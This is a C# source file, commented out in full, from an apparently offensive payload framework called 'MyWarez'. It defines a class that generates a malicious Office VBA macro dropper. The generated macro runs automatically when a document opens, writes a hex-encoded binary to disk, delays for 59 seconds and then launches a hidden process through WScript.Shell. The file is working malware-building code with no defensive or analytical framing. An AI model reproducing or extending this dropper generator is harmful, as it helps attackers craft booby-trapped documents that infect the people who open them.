/*using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;

namespace MyWarez.Payloads
{    
    public class DropperVbaMacro : Dropper
    {
        public DropperVbaMacro(ProcessList processList, Tonsil.Files.FilePath droppedFilePath) : base(processList, droppedFilePath) { }
        public override bool IsCompatible(Tonsil.Files.FileType fileType) => false;
        public override PayloadType Type { get; } = PayloadType.VbaMacro;
        public override string Name { get; } = "DropperVbaMacro";
        public override string Description { get; } = "VbaMacro that writes a file to disk and executes it";
        protected override string EscapeCmdline(string script) => script.Replace(@"""", @"""""");
        public override string Text => base.Text.Replace(NewLine, NewLine + "    ");
        public override string ExecuteProcessString(string cmdline) => string.Format(ExecuteProcessTemplate, EscapeCmdline(cmdline));
        public override string DropFileString(byte[] bytes)
        {
            int lineLength = 80;
            string[] hex_encoded = bytes.Select(b => string.Format("{0:X2}", b)).ToArray();
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < hex_encoded.Length; i++)
            {
                if (i == 0)
                {
                    builder.Append("s = \"");
                }
                else if (i % lineLength == 0)
                {
                    builder.Append("\"");
                    builder.AppendLine();
                    builder.Append("s = s & \"");
                }
                builder.Append(hex_encoded[i] + "|");
            }
            builder.Length--;
            builder.Append("\"");
            var droppedFilePath = DroppedFilePath.Path;
            return string.Format(DropFileTemplate, builder.ToString(), droppedFilePath, "");
        }
        protected override string Template { get; } = @"
Function Run()
On Error Resume Next
{0}
waitTill = Now() + TimeValue(""00:00:59"")
While Now() < waitTill
    DoEvents
Wend
{1}
End Function

Sub Auto_Open()
    Run
End Sub

Sub Document_Open()
    Run
End Sub
";
        protected string ExecuteProcessTemplate = @"CreateObject(""WScript.Shell"").Run ""{0}"", 0, true";
        protected string DropFileTemplate { get; } =
@"
Dim s{2} As String
{0}

Dim output{2}() As String
output{2} = Split(s{2}, ""|"")

Dim handle{2} As Long
handle{2} = FreeFile
Open ""{1}"" For Binary As #handle{2}

Dim i{2} As Long
For i{2} = LBound(output{2}) To UBound(output{2})
    Put #handle{2}, , CByte(""&H"" & output{2}(i))
Next i{2}

Close #handle{2}
";
    }
}*/